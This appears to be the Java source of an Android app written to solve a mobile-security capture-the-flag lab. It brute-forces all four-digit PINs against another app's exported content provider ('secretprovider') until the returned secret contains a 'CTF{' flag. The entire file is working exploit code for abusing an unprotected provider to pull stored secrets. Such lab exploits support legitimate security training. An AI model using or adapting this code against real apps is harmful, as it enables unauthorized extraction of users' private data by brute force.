package me.regne.pinextractor;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "PinExtractor";
    private static final String TAG_FOUND = "PinFound";
    private TextView textView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        textView = findViewById(R.id.textView);
        textView.setText("Searching...");
        ProgressBar progressBar = findViewById(R.id.progressBar); // initiate the progress bar
        progressBar.setMax(9999);

        Thread th = new Thread(() -> {
            for (int pin = 0; pin < 10000; pin++) {
                String pinString = String.format("%04d", pin);
                Log.d(TAG, "Testing PIN: " + pinString);

                runOnUiThread(() -> {
                    textView.setText("Testing PIN: " + pinString);
                    progressBar.setProgress(Integer.parseInt(pinString));
                });

                String secret = checkPin(pinString);
                if (secret != null && secret.contains("CTF{")) {
                    Log.i(TAG_FOUND, "PIN FOUND: " + pin);

                    final String foundSecret = secret;
                    runOnUiThread(() -> textView.setText("PIN FOUND: " + pinString + "\n" + foundSecret));

                    return;
                }
            }
            runOnUiThread(() -> textView.setText("Search completed. No valid PIN found."));
        });

        th.start();
    }

    private String checkPin(String pin) {
        try {
            String secret = null;

            Uri uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");
            String selection = "pin=" + pin;

            Log.d(TAG, "Querying with selection: " + selection);

            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);

            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    int secretColumnIndex = cursor.getColumnIndex("Secret");
                    if (secretColumnIndex != -1) {
                        secret = cursor.getString(secretColumnIndex);
                        if (secret != null && !secret.isEmpty()) {
                            Log.d(TAG_FOUND, "SECRET FOUND with PIN " + pin + ": " + secret);
                        }
                    }
                }
                cursor.close();
            }
            return secret;
        } catch (Exception e) {
            Log.e(TAG, "Error querying provider with PIN " + pin, e);
            return null;
        }
    }
}
